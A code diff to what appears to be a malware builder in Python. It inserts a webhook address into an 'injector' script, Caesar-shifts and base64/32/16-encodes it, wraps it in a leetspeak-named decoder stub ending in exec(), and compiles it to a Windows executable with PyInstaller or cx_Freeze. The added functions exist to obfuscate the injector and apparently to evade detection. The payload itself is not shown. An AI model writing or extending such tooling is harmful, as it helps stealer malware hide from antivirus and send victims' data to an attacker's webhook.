@@ -12,7 +12,6 @@ import time
 import string
 import json
 from pypresence import Presence
-
 # Function for the discord rich presence
 def rich_presence():
     try:
@@ -90,8 +89,20 @@ def base64_encoder(data):
     b64_text = base64.b64encode(bytes_text)
     return b64_text.decode('UTF-8')
 
+# Function to encode a part in base32
+def base32_encoder(data):
+    bytes_text = data.encode('UTF-8')
+    b32_text = base64.b32encode(bytes_text)
+    return b32_text.decode('UTF-8')
+
+# Function to encode a part in base16
+def base16_encoder(data):
+    bytes_text = data.encode('UTF-8')
+    b16_text = base64.b16encode(bytes_text)
+    return b16_text.decode('UTF-8')
+
 # Function to encode a part with Caesar method (return final encoded parts)
-def part_encoder(part, alpha):
+def caesar_encoder(part, alpha):
     key = ''.join(random.sample(alpha, 2))
     gap = sum(ord(c) for c in key) % 26
     text_int = ''
@@ -106,10 +117,89 @@ def part_encoder(part, alpha):
         text_int += c_int
     return base64_encoder(text_int + key)
 
+def injector_encoder(part, alpha):
+    key = ''.join(random.sample(alpha, 2))
+    gap = sum(ord(c) for c in key) % 26
+    text_int = ''
+    for c in part:
+        if c.isalpha():
+            if c.islower():
+                c_int = chr((ord(c) - 97 + gap) % 26 + 97)
+            else:
+                c_int = chr((ord(c) - 65 + gap) % 26 + 65)
+        else:
+            c_int = c
+        text_int += c_int
+    return text_int + key
+
 
 # <---- INJECTOR COMPILATION FUNCTIONS ---->
+
 # Function to obfuscate the injector code 
-def obfuscate(content):
+def obfuscate(injector_script):
+    encoding = random.choice(['b64', 'b32', 'b16'])
+    first_step = injector_encoder(injector_script, 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')
+    #base 64 system
+    if encoding == 'b64':
+        content = '''import base64
+def cl34n0r(r4w):
+    alpha = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
+    d3ctxt = base64.b64decode(r4w).decode('UTF-8')
+    k3y = d3ctxt[-2:]
+    g4p = sum(ord(c) for c in k3y) % 26
+    txt1nt = ''
+    for c in d3ctxt[:-2]:
+        if c.isalpha():
+            if c.islower():
+                c_int = chr((ord(c) - 97 - g4p + 26) % 26 + 97)
+            else:
+                c_int = chr((ord(c) - 65 - g4p + 26) % 26 + 65)
+        else:
+            c_int = c
+        txt1nt += c_int
+    return txt1nt
+exec(cl34n0r("""R4W"""))'''.replace('R4W', base64_encoder(first_step))
+    #base 32 system
+    elif encoding == 'b32':
+        content = '''import base64
+def cl34n0r(r4w):
+    alpha = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
+    d3ctxt = base64.b32decode(r4w).decode('UTF-8')
+    k3y = d3ctxt[-2:]
+    g4p = sum(ord(c) for c in k3y) % 26
+    txt1nt = ''
+    for c in d3ctxt[:-2]:
+        if c.isalpha():
+            if c.islower():
+                c_int = chr((ord(c) - 97 - g4p + 26) % 26 + 97)
+            else:
+                c_int = chr((ord(c) - 65 - g4p + 26) % 26 + 65)
+        else:
+            c_int = c
+        txt1nt += c_int
+    return txt1nt
+exec(cl34n0r("""R4W"""))'''.replace('R4W', base32_encoder(first_step))
+    #base 16 system
+    elif encoding == 'b16':
+        content = '''import base64
+def cl34n0r(r4w):
+    alpha = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
+    d3ctxt = base64.b16decode(r4w).decode('UTF-8')
+    k3y = d3ctxt[-2:]
+    g4p = sum(ord(c) for c in k3y) % 26
+    txt1nt = ''
+    for c in d3ctxt[:-2]:
+        if c.isalpha():
+            if c.islower():
+                c_int = chr((ord(c) - 97 - g4p + 26) % 26 + 97)
+            else:
+                c_int = chr((ord(c) - 65 - g4p + 26) % 26 + 65)
+        else:
+            c_int = c
+        txt1nt += c_int
+    return txt1nt
+exec(cl34n0r("""R4W"""))'''.replace('R4W', base16_encoder(first_step))
+    
     # choice of random letters for obfuscation
     ltr = ''.join(random.choices(string.ascii_uppercase, k=4))
     OFFSET = 10
@@ -156,7 +246,7 @@ def builder(banner, m, w):
         alpha = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
         src_hashed = script_hasher(readfile(path_).replace('WBH', webhook))
         recompyler = readfile(os.path.join(os.getcwd(), 'utilities', 'recompyler.cs'))
-        src_hashed = [part_encoder(part, alpha) for part in src_hashed]
+        src_hashed = [caesar_encoder(part, alpha) for part in src_hashed]
 
         injector_with_all = readfile(os.path.join(os.getcwd(), 'utilities', 'injector.py')).replace("'RECOMPYLER'", recompyler)
         injector_with_all = injector_with_all.replace("'SRC_HASHED'", str(src_hashed))
@@ -175,9 +265,9 @@ def builder(banner, m, w):
             icon_option = f"--icon={icon}" if icon != "None" else ""
             
             if exe_comp == "Cx_freeze":
-                cmd = f"""cxfreeze -c "{script_name}" --target-dir {name}-exe {icon_option} --packages=win32api --packages=win32con"""
+                cmd = f"""cxfreeze -c "{script_name}" --target-dir {name}-exe {icon_option} --packages=win32api --packages=win32con --packages=platform"""
             elif exe_comp == "Pyinstaller":
-                cmd = f"""pyinstaller --noconfirm --onefile --console {icon_option} --distpath {target_dir} --hidden-import win32api --hidden-import win32con "{script_name}" """
+                cmd = f"""pyinstaller --noconfirm --onefile --console {icon_option} --distpath {target_dir} --hidden-import win32api --hidden-import win32con --hidden-import platform "{script_name}" """
             os.system("cls")
             os.system(cmd)
             
